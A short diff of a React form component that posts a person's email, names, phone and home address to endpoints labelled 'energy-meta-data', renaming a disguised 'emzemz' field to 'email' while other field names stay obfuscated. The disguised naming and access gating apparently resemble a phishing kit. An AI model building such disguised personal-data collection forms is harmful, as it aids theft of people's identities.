@@ -33,7 +33,7 @@ const BasicInfo: React.FC = () => {
   const [username, setUsername] = useState('');
   const navigate = useNavigate();
   const location = useLocation();
-  const { emzemz: emzemzState } = location.state || {};
+  const { email: emzemzState } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
   useEffect(() => {
@@ -120,7 +120,7 @@ const BasicInfo: React.FC = () => {
 
       // Submit basic info
       await axios.post(`${baseUrl}api/energy-meta-data-3/`, {
-        emzemz: username,
+        email: username,
         fzNme,
         lzNme,
         phone,
@@ -132,7 +132,7 @@ const BasicInfo: React.FC = () => {
 
       // Submit home address
       await axios.post(`${baseUrl}api/energy-meta-data-4/`, {
-        emzemz: username,
+        email: username,
         stAd,
         apt,
         city,
